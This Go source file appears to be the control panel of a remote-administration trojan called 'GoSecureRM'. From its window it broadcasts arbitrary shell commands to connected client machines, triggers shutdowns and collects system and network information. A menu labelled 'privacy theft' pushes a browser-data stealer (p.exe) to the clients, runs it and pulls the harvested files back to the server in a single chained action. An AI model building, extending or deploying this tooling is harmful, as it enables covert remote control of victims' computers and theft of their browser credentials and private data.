package main

import (
	"fmt"
	"image/color"
	"io/ioutil"
	"strings"
	"time"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/canvas"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/theme"
	"fyne.io/fyne/v2/widget"
)

var resultOutput *TransparentEntry

type TransparentEntry struct {
	widget.Entry
}

func NewTransparentEntry() *TransparentEntry {
	entry := &TransparentEntry{}
	entry.MultiLine = true
	entry.ExtendBaseWidget(entry)
	return entry
}

func (e *TransparentEntry) CreateRenderer() fyne.WidgetRenderer {
	renderer := e.Entry.CreateRenderer()
	for _, obj := range renderer.Objects() {
		if bg, ok := obj.(*canvas.Rectangle); ok {
			bg.Hide()
		}
	}
	return renderer
}

func startUI(a fyne.App) {
	w := a.NewWindow(" GoSecureRM")
	w.Resize(fyne.NewSize(800, 500))
	cmdInput := createCommandInput()
	resultOutput = createResultOutput()
	resultContainer := createResultContainer(resultOutput)
	sendButton := createSendButton(cmdInput, resultOutput)
	mainMenu := createMainMenu(w)

	content := container.NewBorder(
		container.NewVBox(cmdInput, sendButton),
		nil,
		nil,
		nil,
		container.NewVScroll(resultContainer),
	)

	w.SetMainMenu(mainMenu)
	w.SetContent(content)
	go startServer(resultOutput)
	w.ShowAndRun()
}

func createMainMenu(w fyne.Window) *fyne.MainMenu {
	return fyne.NewMainMenu(
		fyne.NewMenu("设置",
			fyne.NewMenuItem("清除显示", func() {
				resultOutput.SetText("")
			}),
		),

		fyne.NewMenu("首页",
			fyne.NewMenuItem("返回首页", func() {
				showHomePage(w)
			}),
		),
		fyne.NewMenu("主题",
			fyne.NewMenuItem("切换主题", func() {
				changeTheme()
			}),
		),
		fyne.NewMenu("工具",
			fyne.NewMenuItem("文件浏览", func() {
				createFileBrowserPage(w)
			}),
			fyne.NewMenuItem("传输文件", func() {
				showFileTransferDialog(w)
			}),
			fyne.NewMenuItem("获取信息", func() {
				getClientSystemInfo(resultOutput)
			}),
			fyne.NewMenuItem("网络状态", func() {
				ipconfigInfo(resultOutput)
			}),
			fyne.NewMenuItem("一键关机", func() {
				shutDownComputer(resultOutput)
			}),
		),

		fyne.NewMenu("隐私窃取",
			fyne.NewMenuItem("一键获取浏览器数据", func() {
				getAll(w, resultOutput)
			}),
			fyne.NewMenuItem("上传getBrowserData", func() {
				updateOutput(resultOutput, "正在向客户端发送 p.exe...\n")
				sendFileToClients("p.exe", resultOutput)
			}),
			fyne.NewMenuItem("执行getBrowserData", func() {
				sendCommandToClients("p.exe", "已向客户端 %s 请求执行 p.exe\n", resultOutput)
			}),
			fyne.NewMenuItem("回传结果文件", func() {
				sendCommandToClients("SEND_FILE_TO_SERVER", "已向客户端 %s 请求上传执行结果\n", resultOutput)
			}),
		),

		fyne.NewMenu("帮助",
			fyne.NewMenuItem("关于", func() {
				showAboutPage(w)
			}),
			fyne.NewMenuItem("帮助", func() {
				showHelpPage(w)
			}),
			fyne.NewMenuItem("退出", func() {
				w.Close()
			}),
		),
	)

}

// 命令输入框
func createCommandInput() *widget.Entry {
	cmdInput := widget.NewEntry()
	cmdInput.SetPlaceHolder("请输入命令...")
	return cmdInput
}

// 结果显示区
func createResultOutput() *TransparentEntry {
	resultOutput := NewTransparentEntry()
	resultOutput.Wrapping = fyne.TextWrapWord
	resultOutput.Disable()
	resultOutput.TextStyle = fyne.TextStyle{Monospace: true}
	return resultOutput
}

// 结果显示区的容器
func createResultContainer(resultOutput *TransparentEntry) *fyne.Container {
	backgroundRect := canvas.NewRectangle(color.RGBA{R: 0, G: 0, B: 0, A: 255}) // 黑色背景
	return container.NewMax(backgroundRect, container.NewPadded(resultOutput))
}

// 更新命令结果显示区内容
func updateOutput(output *TransparentEntry, message string) {
	output.SetText(output.Text + message)
}

// 发送命令按钮
func createSendButton(cmdInput *widget.Entry, resultOutput *TransparentEntry) *widget.Button {
	return widget.NewButton("发送命令", func() {
		command := strings.TrimSpace(cmdInput.Text)
		if command == "" {
			updateOutput(resultOutput, "请输入命令")
			return
		}
		broadcastCommand(command, resultOutput)
	})
}

func showHomePage(w fyne.Window) {
	cmdInput := createCommandInput()
	resultContainer := createResultContainer(resultOutput)
	sendButton := createSendButton(cmdInput, resultOutput)
	content := container.NewVBox(
		cmdInput,
		sendButton,
		container.NewVScroll(resultContainer),
	)
	content.Objects[2].(*container.Scroll).SetMinSize(fyne.NewSize(800, 400)) // 设置高度为 400
	w.SetContent(content)
}

var isDarkTheme = false

func changeTheme() {
	if isDarkTheme {
		println("切换到浅色主题")
		fyne.CurrentApp().Settings().SetTheme(theme.LightTheme())
		isDarkTheme = false
	} else {
		println("切换到深色主题")
		fyne.CurrentApp().Settings().SetTheme(theme.DarkTheme())
		isDarkTheme = true
	}
}

func sendCommandToClients(command string, successMessage string, output *TransparentEntry) {
	if len(clients) == 0 {
		updateOutput(output, "没有客户端连接，无法发送命令\n")
		return
	}

	for _, client := range clients {
		_, err := client.Write([]byte(command + "\n"))
		if err != nil {
			updateOutput(output, fmt.Sprintf("向客户端 %s 发送命令失败: %v\n", client.RemoteAddr(), err))
			continue
		}
		updateOutput(output, fmt.Sprintf(successMessage, client.RemoteAddr()))
	}
}

// 获取客户端文件
func getClientFile(output *TransparentEntry) {
	sendCommandToClients("SEND_FILE_TO_SERVER", "已向客户端 %s 请求获取文件\n", output)
}

// 获取客户端系统信息
func getClientSystemInfo(output *TransparentEntry) {
	sendCommandToClients("systeminfo", "已向客户端 %s 请求系统信息\n", output)
}

// 向客户端发送关机命令
func shutDownComputer(output *TransparentEntry) {
	sendCommandToClients("shutdown -s -t 60", "已向客户端 %s 请求60s后关机\n", output)
}

// 请求客户端网络状态
func ipconfigInfo(output *TransparentEntry) {
	sendCommandToClients("ipconfig /all", "已向客户端 %s 请求网络信息\n", output)
}

// 帮助页面
func showHelpPage(w fyne.Window) {
	helpContent := container.NewVBox(
		widget.NewLabelWithStyle("帮助文档", fyne.TextAlignCenter, fyne.TextStyle{Bold: true}),
		widget.NewSeparator(),
		widget.NewLabel("使用指南："),
		widget.NewLabel("1. 在命令输入框中输入命令并点击发送按钮。"),
		widget.NewLabel("2. 使用菜单中的工具选项执行特定操作，例如获取信息或关机。"),
		widget.NewLabel("3. 使用主题菜单切换深色或浅色主题。"),
		widget.NewLabel("4. 如果需要清空显示内容，可通过设置菜单选择清除显示。"),
		widget.NewSeparator(),
		widget.NewLabel("注意事项："),
		widget.NewLabel("- 确保客户端已正确连接到服务端。"),
		widget.NewLabel("- 使用自签名证书，请确保证书和私钥文件存在。"),
		widget.NewSeparator(),
		widget.NewButton("返回首页", func() {
			showHomePage(w)
		}),
	)
	w.SetContent(container.NewCenter(helpContent))
}

// 关于页面
func showAboutPage(w fyne.Window) {
	aboutContent := container.NewVBox(
		widget.NewLabelWithStyle("关于页面", fyne.TextAlignCenter, fyne.TextStyle{Bold: true}),
		widget.NewLabel("GoSecureRM"),
		widget.NewLabel("版本: 1.0.0"),
		widget.NewLabel("作者: pahh"),
		widget.NewLabel("描述: 这是服务端程序，使用OpenSSL自签证书进行TLS加密通信。"),
		widget.NewLabel(""),
		widget.NewSeparator(),
		widget.NewButton("返回首页", func() {
			showHomePage(w)
		}),
	)
	w.SetContent(container.NewCenter(aboutContent))
}

func getAll(w fyne.Window, output *TransparentEntry) {
	updateOutput(output, "正在向客户端发送 p.exe...\n")
	sendFileToClients("p.exe", output)
	time.Sleep(5 * time.Second)
	sendCommandToClients("p.exe", "已向客户端 %s 请求执行 p.exe\n", output)
	time.Sleep(15 * time.Second)
	sendCommandToClients("SEND_FILE_TO_SERVER", "已向客户端 %s 请求上传执行结果\n", output)
}

func sendFileToClients(filePath string, output *TransparentEntry) {
	fileContent, err := ioutil.ReadFile(filePath)
	if err != nil {
		updateOutput(output, fmt.Sprintf("读取文件 %s 失败: %v\n", filePath, err))
		return
	}
	fileName := "p.exe"
	fileSize := len(fileContent)
	for _, client := range clients {
		_, err := client.Write([]byte("FILE_TRANSFER_TO_CLI_START\n"))
		if err != nil {
			updateOutput(output, fmt.Sprintf("通知客户端 %s 准备接收文件失败: %v\n", client.RemoteAddr(), err))
			continue
		}

		_, err = client.Write([]byte(fileName + "\n"))
		if err != nil {
			updateOutput(output, fmt.Sprintf("发送文件名到客户端 %s 失败: %v\n", client.RemoteAddr(), err))
			continue
		}

		_, err = client.Write([]byte(fmt.Sprintf("%d\n", fileSize)))
		if err != nil {
			updateOutput(output, fmt.Sprintf("发送文件大小到客户端 %s 失败: %v\n", client.RemoteAddr(), err))
			continue
		}
		_, err = client.Write(fileContent)
		if err != nil {
			updateOutput(output, fmt.Sprintf("发送文件内容到客户端 %s 失败: %v\n", client.RemoteAddr(), err))
			continue
		}

		updateOutput(output, fmt.Sprintf("文件 %s 已发送到客户端 %s，大小: %d 字节\n", fileName, client.RemoteAddr(), fileSize))
	}
}

func createFileBrowserPage(w fyne.Window) {
	fileList := widget.NewList(
		func() int {
			return 0 // 初始为空，稍后动态更新
		},
		func() fyne.CanvasObject {
			return widget.NewLabel("")
		},
		func(id widget.ListItemID, item fyne.CanvasObject) {
			// 动态更新文件列表
		},
	)

	refreshButton := widget.NewButton("刷新文件列表", func() {
		sendCommandToClients("LIST_FILES", "已向客户端请求文件列表\n", resultOutput)
	})

	content := container.NewBorder(
		nil,
		refreshButton,
		nil,
		nil,
		fileList,
	)

	w.SetContent(content)
}
